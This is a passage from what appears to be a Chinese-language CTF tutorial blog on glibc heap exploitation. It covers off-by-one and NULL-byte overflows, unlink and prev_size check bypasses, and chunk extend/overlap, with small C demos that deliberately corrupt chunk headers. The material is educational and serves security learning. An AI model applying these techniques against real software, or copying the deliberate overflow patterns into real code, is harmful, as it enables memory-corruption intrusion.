64 位系统为例，分配出来的空间是 16 的整数倍，即用户申请的 <code>chunk</code> 都是 16 字节对齐的</p></blockquote><hr><h1 id="Off-By-One"><a href="#Off-By-One" class="headerlink" title="Off-By-One"></a>Off-By-One</h1><blockquote><p>off-by-one 指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数，并且<strong>只越界了一个字节</strong>，属于一种特殊的溢出漏洞</p><p>参考文章：<a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/off-by-one/">堆中的 off-by-one - CTF Wiki</a></p></blockquote><p>off-by-one 最终的效果是可以将一个释放状态的 <code>small bin chunk</code> 或是 <code>unsorted bin chunk</code> 一直到被溢出 <code>chunk</code> 合并成一个大的 <code>chunk</code></p><hr><h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>这种漏洞的产生往往与边界验证不严和字符串操作有关，例如：</p><ul><li>使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节</li></ul><p>示例：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">my_gets</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span><span class="token keyword">int</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> i<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>chunk1<span class="token punctuation">,</span> <span class="token operator">*</span>chunk2<span class="token punctuation">;</span>    chunk1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    chunk2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Get Input:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">my_gets</span><span class="token punctuation">(</span>chunk1<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于 for 循环的边界没有控制好，导致写入多执行了一次</p><p>执行 <code>my_gets()</code> 之前的堆：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A81.png" alt="CTF - PWN_堆相关的漏洞与利用1.png"></p><p>假设输入了 17 个字节：<code>aaaaaaaaaaaaaaaaa</code>，此时的堆：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A82.png" alt="CTF - PWN_堆相关的漏洞与利用2.png"></p><p>可以看到数据发生了溢出，有一个 <code>&#39;a&#39;</code> 覆盖到了下一个堆块的 <code>prev_size</code> 域</p><ul><li>字符串操作不合适</li></ul><p>示例：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>chunk1<span class="token punctuation">;</span>    chunk1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Get Input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">gets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">24</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">strcpy</span><span class="token punctuation">(</span>chunk1<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果不考虑栈溢出，似乎没什么问题，可能很多人在实际的代码中也是这样写的，但是 <strong><code>strlen</code> 和 <code>strcpy</code> 的行为不一致却导致了 off-by-one 的发生</strong></p><p>原因在于，<code>strlen</code> 在计算字符串长度时不包括结束符 <code>&#39;\x00&#39;</code>，而 <code>strcpy</code> 在复制字符串时会拷贝结束符 <code>&#39;\x00&#39;</code>，因此，最后其实向 <code>chunk1</code> 中写入了 25 个字节</p><p>执行 <code>gets(buffer)</code> 之前的堆：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A83.png" alt="CTF - PWN_堆相关的漏洞与利用3.png"></p><p>执行 <code>strcpy(chunk1, buffer)</code> 之后：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A84.png" alt="CTF - PWN_堆相关的漏洞与利用4.png"></p><p>可以看到 <code>next chunk</code> 的 <code>size</code> 域低字节被结束符 <code>&#39;\x00&#39;</code> 覆盖（这种情况又属于 off-by-one 的一个分支：NULL byte off-by-one）</p><ul><li>当然，也不排除写入的 <code>size</code> 正好就只多了一个字节的情况</li></ul><blockquote><p>一般来说，单字节溢出被认为是难以利用的</p><p>但是因为 Linux 的堆管理机制 <code>ptmalloc2</code> 验证的松散性，基于 Linux 堆的 off-by-one 漏洞利用起来并不复杂，并且威力强大</p></blockquote><hr><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol><li>溢出字节为可控制任意字节</li></ol><p>通过修改大小造成块结构之间出现重叠，从而泄露或者覆盖其他块数据</p><ol start="2"><li>溢出字节为 NULL 字节</li></ol><p>在 <code>size</code> 为 0x100 的时候，溢出 NULL 字节可以使得 <code>prev_in_use</code> 位被清除（记录前一个 <code>chunk</code> 块是否被分配），这样前一个块会被认为是 free 块</p><p>然后可以采用以下方法：</p><p>（1）使用 unlink 方法进行处理</p><p>（2）由于这时 <code>prev_size</code> 域会被启用，可以伪造 <code>prev_size</code> 造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 <code>prev_size</code> 找到的块的大小与 <code>prev_size</code> 是否一致</p><blockquote><p>注意：</p><p>在 Glibc 2.29 以后的版本代码中已经加入针对方法（2）的 <code>check</code> ，因此传统的方法（2）失效；但是在 Glibc 2.28 及之前版本并没有该 <code>check</code>，可以继续使用</p></blockquote><p>Glibc 中对于此处的 <code>check</code> 如下：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* consolidate backward */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">prev_inuse</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      prevsize <span class="token operator">=</span> <span class="token function">prev_size</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>      size <span class="token operator">+=</span> prevsize<span class="token punctuation">;</span>      p <span class="token operator">=</span> <span class="token function">chunk_at_offset</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> prevsize<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">/* 下面两行代码在新版本 Glibc 中加入，则方法（2）无法使用，但是 Glibc 2.28 及之前版本都没有问题      if (__glibc_unlikely (chunksize(p) != prevsize))        malloc_printerr ("corrupted size vs. prev_size while consolidating"); */</span>      <span class="token function">unlink_chunk</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Glibc 2.29 以后的版本中， <code>check</code> 处增加了两行代码：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span><span class="token function">chunksize</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">!=</span> prevsize<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"corrupted size vs. prev_size while consolidating"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这让我们想要控制一个真实 <code>chunk</code> 的 <code>size</code> 字段变得更加困难，所以传统的 NULL byte off-by-one 方法失效</p><p>但是，只需要满足被 unlink 的 <code>chunk</code> 和下一个 <code>chunk</code> 相连，仍然可以伪造 <code>fake_chunk</code></p><p>伪造的方式就是使用 <code>large bin</code> 遗留的 <code>fd_nextsize</code> 和 <code>bk_nextsize</code> 指针：</p><ul><li>以 <code>fd_nextsize</code> 为 <code>fake_chunk</code> 的 <code>fd</code></li><li>以 <code>bk_nextsize</code> 为 <code>fake_chunk</code> 的 <code>bk</code></li></ul><p>这样我们可以完全控制该 <code>fake_chunk</code> 的 <code>size</code> 字段（这个过程会破坏原 <code>large bin chunk</code> 的 <code>fd</code> 指针，但是没有关系），同时还可以通过部分覆写 <code>fd_nextsize</code> 控制其 <code>fd</code>，然后在后面使用其他的 <code>chunk</code> 辅助伪造，可以通过该 <code>check</code></p><p>然后只需要通过 unlink 的检测就可以了，也就是：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">(</span>fd <span class="token operator">-></span> bk <span class="token operator">==</span> p<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>bk <span class="token operator">-></span> fd <span class="token operator">==</span> p<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>如果 <code>large bin</code> 中仅有一个 <code>chunk</code>，那么该 <code>chunk</code> 的 <code>fd_nextsize</code> 指针和 <code>bk_nextsize</code> 指针都会指向自己</p></blockquote><ol><li><p>我们可以控制 <code>fd_nextsize</code> 指向堆上的任意地址，可以容易地使之指向一个 <code>fast bin + 0x10 - 0x18</code>，而 <code>fast bin</code> 中的 <code>fd</code> 也会指向堆上的一个地址，通过部分覆写该指针也可以使该指针指向之前的 <code>large bin + 0x10</code>，这样就可以通过 <code>fd -&gt; bk == p</code> 的检测</p></li><li><p>由于 <code>bk_nextsize</code> 我们无法修改，所以 <code>bk -&gt; fd</code> 必然在原先的 <code>large bin chunk</code> 的 <code>fd</code> 指针处（这个 <code>fd</code> 被我们破坏了），通过 <code>fast bin</code> 的链表特性可以做到修改这个指针且不影响其他的数据，再将其部分覆写就可以通过 <code>bk -&gt; fd == p</code> 的检测</p></li><li><p>然后通过 off-by-one 向低地址合并，实现 <code>chunk Overlap</code>，之后可以泄露 libc 的基地址和堆地址，然后 <code>tcache</code> 打 <code>__free_hook</code> 即可</p></li></ol><hr><h2 id="相关例题"><a href="#相关例题" class="headerlink" title="相关例题"></a>相关例题</h2><p>见本站 《<a href="%E3%80%90Asis%20CTF%202016%E3%80%91b00ks.md">【Asis CTF 2016】b00ks</a>》、《<a href="%E3%80%90plaidctf%202015%E3%80%91PlaidDB.md">【plaidctf 2015】PlaidDB</a>》</p><hr><h1 id="Chunk-Extend-and-Overlap"><a href="#Chunk-Extend-and-Overlap" class="headerlink" title="Chunk Extend and Overlap"></a>Chunk Extend and Overlap</h1><blockquote><p><code>chunk extend</code>（堆扩展）是堆漏洞的一种常见利用手法，通过 <code>extend</code> 可以实现 <code>chunk Overlap</code>（堆重叠）的效果</p><p>参考文章：<a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/chunk-extend-overlapping/">Chunk Extend and Overlapping - CTF Wiki</a></p></blockquote><p>这种利用方法通常需要以下条件：</p><ul><li>程序中存在基于堆的漏洞</li><li>漏洞可以控制 <code>chunk header</code> 中的数据</li></ul><p>一般来说，<code>Chunk Extend and Overlap</code> 并不能直接控制程序的执行流程，但是可以控制 <code>chunk</code> 中的内容：</p><ul><li><p>如果 <code>chunk</code> 存在字符串指针、函数指针等，就可以利用这些指针来进行信息泄漏和控制执行流程</p></li><li><p>此外，<code>chunk extend</code> 通过控制 <code>size</code> 和 <code>pre_size</code> 域可以实现 <code>chunk Overlap</code>，通过 <code>Overlap</code> 可以控制 <code>chunk</code> 的 <code>fd / bk</code> 指针从而可以实现 <code>fastbin attack</code> 等利用</p></li></ul><hr><h2 id="对-inuse-的-fast-bin-进行-extend"><a href="#对-inuse-的-fast-bin-进行-extend" class="headerlink" title="对 inuse 的 fast bin 进行 extend"></a>对 inuse 的 fast bin 进行 extend</h2><blockquote><p>当我们创建两个堆块 <code>chunk1</code> 和 <code>chunk2</code> 时，通过修改 <code>chunk1</code> 的 <code>size</code> 域，使其 <code>size</code> 的大小包含 <code>chunk2</code>，那么 <code>free</code> 掉 <code>chunk1</code> 的时候，<code>chunk2</code> 也会被 <code>free</code> 掉</p><p>而当我们再次请求这两个堆块大小之和的堆块时，就会获得 <code>chunk1 + chunk2</code> 的空间，也就可以控制 <code>chunk2</code> 的内容</p></blockquote><p>示例：（64 位程序）</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token operator">*</span>ptr1<span class="token punctuation">;</span>    ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 分配第一个 0x10 的 chunk</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 分配第二个 0x10 的chunk</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span> ptr <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x41</span><span class="token punctuation">;</span>   <span class="token comment">// 修改第一个块的 size 域</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    ptr1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 实现 extend，控制了第二个块的内容</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当我们 <code>malloc</code> 两个堆块后：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A85.png" alt="CTF - PWN_堆相关的漏洞与利用5.png"></p><p>然后修改 <code>chunk1</code> 的 <code>size</code> 域为 <code>0x41</code>（包括了 <code>chunk2</code> 的大小）：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A86.png" alt="CTF - PWN_堆相关的漏洞与利用6.png"></p><p>可以看到 <code>free</code> 掉 <code>chunk1</code> 后，<code>chunk2</code> 也被 <code>free</code> 掉了：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A87.png" alt="CTF - PWN_堆相关的漏洞与利用7.png"></p><p>此时如果我们再通过 <code>malloc(0x30)</code> 分配堆块，就会得到 <code>chunk1 + chunk2</code> 的块，此时就可以直接控制 <code>chunk2</code> 中的内容</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A88.png" alt="CTF - PWN_堆相关的漏洞与利用8.png"></p><p>这种状态就称为 <code>Overlap chunk</code></p><hr><h2 id="对-inuse-的-small-bin-进行-extend"><a href="#对-inuse-的-small-bin-进行-extend" class="headerlink" title="对 inuse 的 small bin 进行 extend"></a>对 inuse 的 small bin 进行 extend</h2><blockquote><p>当 <code>free</code> 掉的 <code>chunk size &gt;= 144</code>（0x90）字节时，会被置于 <code>unsorted bin</code> 中，这次以 <code>malloc(0x80)</code> 来举例</p><p>与前面的 <code>fast bin</code> 不同的是，这种情况下还需要再 <code>malloc</code> 一块空间用来防止 <code>unsorted bin</code> 与 <code>top chunk</code> 合并</p></blockquote><p>示例：（64 位程序）</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token operator">*</span>ptr1<span class="token punctuation">;</span>    ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 分配第一个 0x80 的 chunk1</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 分配第二个 0x10 的 chunk2</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 防止与 top chunk 合并</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> ptr <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0xb1</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    ptr1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当我们 <code>malloc</code> 三个堆块后（<code>chunk3</code> 用来防止 <code>chunk1</code> 被篡改并 <code>free</code> 后与 <code>top chunk</code> 合并）：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A89.png" alt="CTF - PWN_堆相关的漏洞与利用9.png"></p><p>然后修改 <code>chunk1</code> 的 <code>size</code> 域为 <code>0xb1</code>（包括了 <code>chunk2</code> 的大小）：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A810.png" alt="CTF - PWN_堆相关的漏洞与利用10.png"></p><p>可以看到 <code>free</code> 掉 <code>chunk1</code> 后，<code>chunk2</code> 也被 <code>free</code> 掉了：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A811.png" alt="CTF - PWN_堆相关的漏洞与利用11.png"></p><p>此时 <code>chunk1</code> 和 <code>chunk2</code> 被一起置入 <code>unsorted bin</code></p><p>此时如果我们再通过 <code>malloc(0xa0)</code> 分配堆块，就会得到 <code>chunk1 + chunk2</code> 的块，此时就可以直接控制 <code>chunk2</code> 中的内容：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A812.png" alt="CTF - PWN_堆相关的漏洞与利用12.png"></p><hr><h2 id="对-free-的-small-bin-进行-extend"><a href="#对-free-的-small-bin-进行-extend" class="headerlink" title="对 free 的 small bin 进行 extend"></a>对 free 的 small bin 进行 extend</h2><blockquote><p>在，先释放 <code>chunk1</code>，然后再修改处于 <code>unsorted bin</code> 中的 <code>chunk1</code> 的 <code>size</code> 域，会使得 chunk2 也被置于 <code>unsorted bin</code> 中</p><p>当我们再次请求这两个堆块大小之和的堆块时，就会获得 <code>chunk1 + chunk2</code> 的空间，也就可以控制 <code>chunk2</code> 的内容</p></blockquote><p>示例：（64 位程序）</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token operator">*</span>ptr1<span class="token punctuation">;</span>    ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 分配第一个 0x80 的 chunk1</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 分配第二个 0x10 的 chunk2</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 首先进行释放，使得 chunk1 进入 unsorted bin</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> ptr <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0xb1</span><span class="token punctuation">;</span>    ptr1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当 <code>malloc</code> 分配两个堆块后，直接 <code>free</code> 掉 <code>chunk1</code> 使其被置于 <code>unsorted bin</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A813.png" alt="CTF - PWN_堆相关的漏洞与利用13.png"></p><p>此时修改 <code>unsorted bin</code> 的 <code>size</code> 域为 <code>0xb1</code>（包括了 <code>chunk2</code> 的大小），发现 <code>chunk2</code> 也被置于 <code>unsorted bin</code> 中：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A814.png" alt="CTF - PWN_堆相关的漏洞与利用14.png"></p><p>然后再 <code>malloc(0xa0)</code> 的大小就可以得到 <code>chunk1 + chunk2</code> 的堆块，从而控制了 <code>chunk2</code> 的内容：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A815.png" alt="CTF - PWN_堆相关的漏洞与利用15.png"></p><hr><h2 id="通过-extend-后向-Overlap"><a href="#通过-extend-后向-Overlap" class="headerlink" title="通过 extend 后向 Overlap"></a>通过 extend 后向 Overlap</h2><p>示例：（64 位程序）</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token operator">*</span>ptr1<span class="token punctuation">;</span>    ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 分配第 1 个 0x80 的 chunk1</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 分配第 2 个 0x10 的 chunk2</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 分配第 3 个 0x10 的 chunk3</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 分配第 4 个 0x10 的 chunk4    </span>        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> ptr <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x61</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    ptr1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当 <code>malloc</code> 分配四个堆块后：</p><p><img 